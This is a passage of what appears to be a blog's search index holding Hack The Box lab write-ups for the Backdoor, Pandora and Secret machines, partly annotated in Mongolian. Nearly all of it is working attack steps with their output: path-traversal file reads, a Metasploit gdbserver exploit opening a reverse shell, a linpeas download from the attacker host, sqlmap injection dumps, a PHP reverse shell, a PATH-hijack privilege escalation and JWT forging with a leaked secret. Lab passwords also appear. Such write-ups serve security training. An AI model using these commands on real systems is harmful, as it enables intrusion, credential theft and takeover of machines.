http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/840/cmdline \u0026gt; 840.txt 842\ncurl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/842/cmdline \u0026gt; 842.txt 836\ncurl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/836/cmdline \u0026gt; 836.txt 852\ncurl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/852/cmdline \u0026gt; 852.txt #840 /proc/840/cmdline/proc/840/cmdline/proc/840/cmdline/bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \\;; done\u0026lt;script\u0026gt;window.close()\u0026lt;/script\u0026gt; #842 /proc/842/cmdline/proc/842/cmdline/proc/842/cmdline/bin/sh-cwhile true;do su user -c \u0026#34;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\u0026#34;; done\u0026lt;script\u0026gt;window.close()\u0026lt;/script\u0026gt; #836 /proc/836/cmdline/proc/836/cmdline/proc/836/cmdline/sbin/agetty-o-p -- \\u--nocleartty1linux\u0026lt;script\u0026gt;window.close()\u0026lt;/script\u0026gt; #852 /proc/852/cmdline/proc/852/cmdline/proc/852/cmdlinesshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups\u0026lt;script\u0026gt;window.close()\u0026lt;/script\u0026gt; gdbserver\nsudo msfdb run msf6 \u0026gt; use exploit/multi/gdb/gdb_server_exec [*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp # Options set payload linux/x64/meterpreter/reverse_tcp set RHOSTS 10.10.11.125 set RPORT 1337 set lhost tun0 run [*] Started reverse TCP handler on 10.10.14.25:4444 [*] 10.10.11.125:1337 - Performing handshake with gdbserver... [*] 10.10.11.125:1337 - Stepping program to find PC... [*] 10.10.11.125:1337 - Writing payload at 00007ffff7fd0103... [*] 10.10.11.125:1337 - Executing the payload... [*] Sending stage (3012548 bytes) to 10.10.11.125 [*] Meterpreter session 1 opened (10.10.14.25:4444 -\u0026gt; 10.10.11.125:47602) at 2022-02-24 03:30:28 -05 4.1 shell balance shell which python python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; export TERM=xterm user.txt:\nf2a0d92************ 5. Enumeration linpeas\ncurl 10.10.14.25:8000/linpeas.sh -o linpeas.sh ## chmod +x linpeas.sh ╔═══════════════════╗ ═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════ ╚═══════════════════╝ ╔══════════╣ SUID - Check easy privesc, exploits and write perms ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid strings Not Found -rwsr-xr-- 1 root messagebus 51K Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 15K Jul 8 2019 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 23K May 26 2021 /usr/lib/policykit-1/polkit-agent-helper-1 ^[[1;5D-rwsr-xr-x 1 root root 463K Jul 23 2021 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 67K Jul 14 2021 /usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solar is_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 84K Jul 14 2021 /usr/bin/chfn ---\u0026gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 87K Jul 14 2021 /usr/bin/gpasswd -rwsr-sr-x 1 daemon daemon 55K Nov 12 2018 /usr/bin/at ---\u0026gt; RTru64_UNIX_4.0g(CVE-2002-1614) -rwsr-xr-x 1 root root 67K Jul 21 2020 /usr/bin/su -rwsr-xr-x 1 root root 163K Jan 19 2021 /usr/bin/sudo ---\u0026gt; check_if_the_sudo_version_is_vulnerable -rwsr-xr-x 1 root root 44K Jul 14 2021 /usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-xr-x 1 root root 39K Mar 7 2020 /usr/bin/fusermount -rwsr-xr-x 1 root root 464K Feb 23 2021 /usr/bin/screen ---\u0026gt; GNU_Screen_4.5.0 -rwsr-xr-x 1 root root 39K Jul 21 2020 /usr/bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 55K Jul 21 2020 /usr/bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 52K Jul 14 2021 /usr/bin/chsh -rwsr-xr-x 1 root root 31K May 26 2021 /usr/bin/pkexec ---\u0026gt; Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485) screen -x root/root root:\nid uid=0(root) gid=0(root) groups=0(root) root.txt\ndb4c739****** ","permalink":"https://cadil.github.io/posts/2024-03-05-htb-backdoor-writeup/","summary":"1. IP Address # Machine Address 10.10.11.125 2. Nmap nmap -p 1-2000 -sV -sC -oA nmap/backdoor_with_port 10.10.11.125 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-24 02:43 EST Nmap scan report for 10.10.11.125 Host is up (0.24s latency). Not shown: 1997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA) | 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA) |_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519) 80/tcp open http Apache httpd 2.","title":"HTB - Backdoor"},{"content":"1. IP Address # Machine Address 10.10.11.136 # Local Address 10.10.14.4 2. Nmap nmap -sV -sC -oA nmap/pandora 10.10.11.136 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-20 23:41 EST Nmap scan report for 10.10.11.136 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Play | Landing Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.71 seconds nmap -vvv -p 22,80 -A -v -sC -sV -oN intial.nmap 10.10.11.136 # Nmap 7.91 scan initiated Sun Feb 20 23:44:42 2022 as: nmap -vvv -p 22, -A -v -sC -sV -oN nmap/intial.nmap 80 10.10.11.136 Nmap scan report for 80 (0.0.0.80) [host down, received no-response] Nmap scan report for 10.10.11.136 Host is up, received syn-ack (0.24s latency). Scanned at 2022-02-20 23:44:42 EST for 11s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs= | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w= | 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Feb 20 23:44:53 2022 -- 2 IP addresses (1 host up) scanned in 11.32 seconds sudo nmap -sU -top-ports=20 panda.htb Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-21 00:03 EST Nmap scan report for panda.htb (10.10.11.136) Host is up (0.24s latency). PORT STATE SERVICE 53/udp open|filtered domain 67/udp closed dhcps 68/udp closed dhcpc 69/udp closed tftp 123/udp closed ntp 135/udp closed msrpc 137/udp open|filtered netbios-ns 138/udp closed netbios-dgm 139/udp open|filtered netbios-ssn 161/udp open|filtered snmp 162/udp closed snmptrap 445/udp closed microsoft-ds 500/udp closed isakmp 514/udp closed syslog 520/udp closed route 631/udp closed ipp 1434/udp closed ms-sql-m 1900/udp closed upnp 4500/udp closed nat-t-ike 49152/udp closed unknown Nmap done: 1 IP address (1 host up) scanned in 12.38 seconds 3. Snmpwalk sudo apt-get install snmp snmpwalk -v 1 -c public panda.htb \u0026gt; common.txt -u daniel -p HotelBabylon23 SSH\nssh daniel@10.10.11.136 #id uid=1001(daniel) gid=1001(daniel) groups=1001(daniel) #sudo -l Sorry, user daniel may not run sudo on pandora. netstat -tunpn | grep LISTEN (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) 4. Exploitation Hosts\n127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb 127.0.1.1 pandora # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters curl\ncurl localhost.localdomain/pandora_console/ 4.1 Port forwarding port forwarding from vm machine:\nssh -D 9090 daniel@10.10.11.136 #or ssh -i 80:localhost:80 daniel@panda.htb local vm -s localhost.localdomain/pandora_console/ хандана.\nproxychains\nsudo vi /etc/proxychains.conf #add socks5 127.0.0.1 9090 daniel HotelBabylon23 #sqlmap sudo proxychains sqlmap --url=\u0026#34;http://localhost/pandora_console/include/chart_generator.php?session_id=\u0026#39;\u0026#39;\u0026#34; -D pandora --tables sudo proxychains sqlmap --url=\u0026#34;http://localhost/pandora_console/include/chart_generator.php?session_id=\u0026#39;\u0026#39;\u0026#34; -D pandora -T tpassword_history --dump Database: pandora Table: tpassword_history [2 entries] +---------+---------+---------------------+----------------------------------+---------------------+ | id_pass | id_user | date_end | password | date_begin | +---------+---------+---------------------+----------------------------------+---------------------+ | 1 | matt | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 | | 2 | daniel | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 | +---------+---------+---------------------+----------------------------------+---------------------+ Session history:\nsudo proxychains sqlmap --url=\u0026#34;http://localhost/pandora_console/include/chart_generator.php?session_id=\u0026#39;\u0026#39;\u0026#34; -D pandora -T tsessions_php --dump | sdhjq94o4rhh2ae583881rk749 | id_usuario|s:5:\u0026#34;admin\u0026#34;;alert_msg|a:0:{}new_chat|b:0; | 1645407015 | энэ cookie session болохгүй байсан\u0026hellip;\n4.2 CVE-2021-32099 https://github.com/ibnuuby/CVE-2021-32099\nadmin tool -\u0026gt; file manager цэсээр ороод php reverse shell хуулна.\nnc -lvnp 9001 # http://localhost/pandora_console/images/php_rev.php # хандаад shell руу орно. 4.3 Shell balance python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ctrl+z\nstty raw -echo f+g [enter enter] буцаад nc орлоо\nexport TERM=xterm user.txt\nb56461f05***** 5. Enumeration sudo -l # sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted sudo: unable to initialize policy plugin find / -user root -perm -4000 -exec ls -ldb {} \\; \u0026gt;/tmp/suidfiles matt@pandora:/tmp$ ls suidfiles matt@pandora:/tmp$ cat suidfiles -rwsr-xr-x 1 root root 166056 Jan 19 2021 /usr/bin/sudo -rwsr-xr-x 1 root root 31032 May 26 2021 /usr/bin/pkexec -rwsr-xr-x 1 root root 85064 Jul 14 2021 /usr/bin/chfn -rwsr-xr-x 1 root root 44784 Jul 14 2021 /usr/bin/newgrp -rwsr-xr-x 1 root root 88464 Jul 14 2021 /usr/bin/gpasswd -rwsr-xr-x 1 root root 39144 Jul 21 2020 /usr/bin/umount -rwsr-x--- 1 root matt 16816 Dec 3 15:58 /usr/bin/pandora_backup -rwsr-xr-x 1 root root 68208 Jul 14 2021 /usr/bin/passwd -rwsr-xr-x 1 root root 55528 Jul 21 2020 /usr/bin/mount -rwsr-xr-x 1 root root 67816 Jul 21 2020 /usr/bin/su -rwsr-xr-x 1 root root 39144 Mar 7 2020 /usr/bin/fusermount -rwsr-xr-x 1 root root 53040 Jul 14 2021 /usr/bin/chsh -rwsr-xr-x 1 root root 473576 Jul 23 2021 /usr/lib/openssh/ssh-keysign -rwsr-xr-- 1 root messagebus 51344 Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 14488 Jul 8 2019 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 22840 May 26 2021 /usr/lib/policykit-1/polkit-agent-helper-1 Backup UtilityNow attempting to backup PandoraFMS clienttar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora!07P@C=jpv=D\u0026#34;=== @ailed! ssh\nssh-keygen -t rsa # history matt@pandora:/home/matt$ ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/home/matt/.ssh/id_rsa): Created directory \u0026#39;/home/matt/.ssh\u0026#39;. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/matt/.ssh/id_rsa Your public key has been saved in /home/matt/.ssh/id_rsa.pub The key fingerprint is: SHA256:9zHdIiJsSlQFOaC9aL2Ps3CVHT4hS2hIfWnb0yS0zoo matt@pandora The key\u0026#39;s randomart image is: +---[RSA 3072]----+ | ....o*o | | . +.o* ... | | o =oo+++ | | = +.Ooo.. . | | o + S O.+ o .| | . . * + + + . | | . E . . | | o.o | | oo. | +----[SHA256]-----+ cd .ssh cat id_rsa.pub \u0026gt; authorized_keys # history matt@pandora:/home/matt/.ssh$ ls id_rsa id_rsa.pub matt@pandora:/home/matt/.ssh$ cat id_rsa.pub \u0026gt; authorized_keys matt@pandora:/home/matt/.ssh$ ls authorized_keys id_rsa id_rsa.pub matt@pandora:/home/matt/.ssh$ cat authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMWVpzp5*******************k= matt@pandora matt@pandora:/home/matt/.ssh$ chmod 700 .ssh cd .ssh chmod 600 authorized_keys Local vm руу id_rsa хуулна.\nmatt@pandora:/home/matt/.ssh$ python3 -m http.server 9001 Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ... 10.10.14.6 - - [22/Feb/2022 06:28:54] \u0026#34;GET /id_rsa HTTP/1.1\u0026#34; 200 - 10.10.14.6 - - [22/Feb/2022 06:29:09] \u0026#34;GET /id_rsa HTTP/1.1\u0026#34; 200 - # Local VM └──╼ $curl 10.10.11.136:9001/id_rsa -o id_rsa % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2602 100 2602 0 0 5172 0 --:--:-- --:--:-- --:--:-- 5235 # chmod chmod 600 id_rsa ssh -i id_rsa matt@10.10.11.136 matt ssh:\necho \u0026#34;/bin/bash\u0026#34; \u0026gt; tar chmod +x tar export PATH=$(pwd):$PATH /usr/bin/pandora_backup PandoraFMS Backup Utility Now attempting to backup PandoraFMS client root.txt\n9087141******** ","permalink":"https://cadil.github.io/posts/2024-03-04-htb-pandora-writeup/","summary":"1. IP Address # Machine Address 10.10.11.136 # Local Address 10.10.14.4 2. Nmap nmap -sV -sC -oA nmap/pandora 10.10.11.136 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-20 23:41 EST Nmap scan report for 10.10.11.136 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.","title":"HTB - Pandora"},{"content":"1. IP Address # Machine Address 10.10.11.120 # Local Address 10.10.14.140 2. Nmap \u0026amp; Nikto 2.1 Nmap nmap -sV -sC -oA nmap/secret 10.10.11.120 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-18 01:24 EST Nmap scan report for 10.10.11.120 Host is up (0.24s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: DUMB Docs 3000/tcp open http Node.js (Express middleware) |_http-title: DUMB Docs Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.31 seconds nmap -vvv -p 22,80,3000 -A -v -sC -sV -oN intial.nmap 10.10.11.120 2.2 Nikto nikto -h 10.10.11.120 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.11.120 + Target Hostname: 10.10.11.120 + Target Port: 80 + Start Time: 2022-02-18 01:25:46 (GMT-5) --------------------------------------------------------------------------- + Server: nginx/1.18.0 (Ubuntu) + Retrieved x-powered-by header: Express + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use \u0026#39;-C all\u0026#39; to force check all possible dirs) 3. Source Code Download хэсэгт files.zip:\ntotal 84 drwxrwxr-x 1 ca4mi ca4mi 182 Sep 3 01:57 . drwxr-xr-x 1 ca4mi ca4mi 36 Feb 18 01:29 .. -rw-rw-r-- 1 ca4mi ca4mi 72 Sep 3 01:59 .env drwxrwxr-x 1 ca4mi ca4mi 144 Sep 8 14:33 .git -rw-rw-r-- 1 ca4mi ca4mi 885 Sep 3 01:56 index.js drwxrwxr-x 1 ca4mi ca4mi 14 Aug 13 2021 model drwxrwxr-x 1 ca4mi ca4mi 4158 Aug 13 2021 node_modules -rw-rw-r-- 1 ca4mi ca4mi 491 Aug 13 2021 package.json -rw-rw-r-- 1 ca4mi ca4mi 69452 Aug 13 2021 package-lock.json drwxrwxr-x 1 ca4mi ca4mi 20 Sep 3 01:54 public drwxrwxr-x 1 ca4mi ca4mi 80 Sep 3 02:32 routes drwxrwxr-x 1 ca4mi ca4mi 22 Aug 13 2021 src -rw-rw-r-- 1 ca4mi ca4mi 651 Aug 13 2021 validations.js .env:\nDB_CONNECT = \u0026#39;mongodb://127.0.0.1:27017/auth-web\u0026#39; TOKEN_SECRET = secret Gittools .git:\nmkdir dump bash /opt/tools/Extractor/extractor.sh local-web/ dump curl -X POST -H \u0026#39;Content-Type: application/json\u0026#39; -v http://secret.htb/api/user/register --data \u0026#39;{\u0026#34;foo\u0026#34;: \u0026#34;bar\u0026#34;}\u0026#39; Note: Unnecessary use of -X or --request, POST is already inferred. * Trying 10.10.11.120:80... * Connected to secret.htb (10.10.11.120) port 80 (#0) \u0026gt; POST /api/user/register HTTP/1.1 \u0026gt; Host: secret.htb \u0026gt; User-Agent: curl/7.74.0 \u0026gt; Accept: */* \u0026gt; Content-Type: application/json \u0026gt; Content-Length: 14 \u0026gt; * upload completely sent off: 14 out of 14 bytes * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 400 Bad Request \u0026lt; Server: nginx/1.18.0 (Ubuntu) \u0026lt; Date: Fri, 18 Feb 2022 07:54:16 GMT \u0026lt; Content-Type: text/html; charset=utf-8 \u0026lt; Content-Length: 18 \u0026lt; Connection: keep-alive \u0026lt; X-Powered-By: Express \u0026lt; ETag: W/\u0026#34;12-FCVaNPnXYf0hIGYsTUTYByRq5/U\u0026#34; \u0026lt; * Connection #0 to host secret.htb left intact \u0026#34;name\u0026#34; is required \u0026quot;name\u0026quot; is required OK\nvalidation.js:\nconst Joi = require(\u0026#39;@hapi/joi\u0026#39;) // register validation const registerValidation = data =\u0026gt;{ const schema = { name: Joi.string().min(6).required(), email: Joi.string().min(6).required().email(), password: Joi.string().min(6).required() }; return Joi.validate(data, schema) } // login validation const loginValidation = data =\u0026gt; { const schema2 = { email: Joi.string().min(6).required().email(), password: Joi.string().min(6).required() }; return Joi.validate(data, schema2) } module.exports.registerValidation = registerValidation module.exports.loginValidation = loginValidation auth.js:\n// create jwt const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET ) res.header(\u0026#39;auth-token\u0026#39;, token).send(token); TOKEN_SECRET?\n.env:\nDB_CONNECT = \u0026#39;mongodb://127.0.0.1:27017/auth-web\u0026#39; TOKEN_SECRET = secret dump:\ndrwxr-xr-x 1 ca4mi ca4mi 204 Feb 18 02:50 0-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 drwxr-xr-x 1 ca4mi ca4mi 220 Feb 18 02:51 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8 drwxr-xr-x 1 ca4mi ca4mi 204 Feb 18 02:53 2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b drwxr-xr-x 1 ca4mi ca4mi 204 Feb 18 02:54 3-de0a46b5107a2f4d26e348303e76d85ae4870934 drwxr-xr-x 1 ca4mi ca4mi 220 Feb 18 02:56 4-3a367e735ee76569664bf7754eaaade7c735d702 drwxr-xr-x 1 ca4mi ca4mi 204 Feb 18 02:57 5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb /dump/1-55fe756a29268f9b4e786ae468952ca4a8df1bd8:\nDB_CONNECT = \u0026#39;mongodb://127.0.0.1:27017/auth-web\u0026#39; TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE verifytoken.js:\nconst jwt = require(\u0026#34;jsonwebtoken\u0026#34;); module.exports = function (req, res, next) { const token = req.header(\u0026#34;auth-token\u0026#34;); if (!token) return res.status(401).send(\u0026#34;Access Denied\u0026#34;); try { const verified = jwt.verify(token, process.env.TOKEN_SECRET); req.user = verified; next(); } catch (err) { res.status(400).send(\u0026#34;Invalid Token\u0026#34;); } }; 4. Register User Create User:\ncurl -X POST -H \u0026#39;Content-Type: application/json\u0026#39; -v http://secret.htb/api/user/register --data \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;ttttyly\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;ttttyly@ttttyly.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;ttttyly\u0026#34;}\u0026#39; Login:\ncurl -X POST -H \u0026#39;Content-Type: application/json\u0026#39; -v http://secret.htb/api/user/login --data \u0026#39;{\u0026#34;email\u0026#34;:\u0026#34;ttttyly@ttttyly.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;ttttyly\u0026#34;}\u0026#39; Note: Unnecessary use of -X or --request, POST is already inferred. * Trying 10.10.11.120:80... * Connected to secret.htb (10.10.11.120) port 80 (#0) \u0026gt; POST /api/user/login HTTP/1.1 \u0026gt; Host: secret.htb \u0026gt; User-Agent: curl/7.74.0 \u0026gt; Accept: */* \u0026gt; Content-Type: application/json \u0026gt; Content-Length: 52 \u0026gt; * upload completely sent off: 52 out of 52 bytes * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 200 OK \u0026lt; Server: nginx/1.18.0 (Ubuntu) \u0026lt; Date: Sun, 20 Feb 2022 05:02:35 GMT \u0026lt; Content-Type: text/html; charset=utf-8 \u0026lt; Content-Length: 212 \u0026lt; Connection: keep-alive \u0026lt; X-Powered-By: Express \u0026lt; auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64 \u0026lt; ETag: W/\u0026#34;d4-oM8BhVITzPnt1fTP3GjDWP1r3pE\u0026#34; \u0026lt; * Connection #0 to host secret.htb left intact eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64 Нэвтрэн орсон\ncurl http://secret.htb/api/priv -H \u0026#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64 \u0026lt; ETag: W/\u0026#34;d4-oM8BhVITzPnt1fTP3GjDWP1r3pE\u0026#39; {\u0026#34;role\u0026#34;:{\u0026#34;role\u0026#34;:\u0026#34;you are normal user\u0026#34;,\u0026#34;desc\u0026#34;:\u0026#34;ttttyly\u0026#34;}} JWT Token хөрвүүлэх: https://github.com/ticarpi/jwt_tool\ntar xvzf jwt_tool-2.2.5.tar.gz python3 -m pip install termcolor cprint pycryptodomex requests python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64 \u0026lt; ETag: W/\u0026#34;d4-oM8BhVITzPnt1fTP3GjDWP1r3pE ===================== Decoded Token Values: ===================== Token header values: [+] alg = \u0026#34;HS256\u0026#34; [+] typ = \u0026#34;JWT\u0026#34; Token payload values: [+] _id = \u0026#34;6211cb53b289b4045a91baa4\u0026#34; [+] name = \u0026#34;ttttyly\u0026#34; [+] email = \u0026#34;ttttyly@ttttyly.com\u0026#34; [+] iat = 1645333355 ==\u0026gt; TIMESTAMP = 2022-02-20 00:02:35 (UTC) ---------------------- JWT common timestamps: iat = IssuedAt exp = Expires nbf = NotBefore ---------------------- Source -с олдсон key нэмэх:\npython3 jwt_tool.py -I -S hs256 -pc \u0026#39;name\u0026#39; -pv \u0026#39;theadmin\u0026#39; -p \u0026#39;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE\u0026#39; eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64 \u0026lt; ETag: W/\u0026#34;d4-oM8BhVITzPnt1fTP3GjDWP1r3pE Нэмсэн token:\nOriginal JWT: 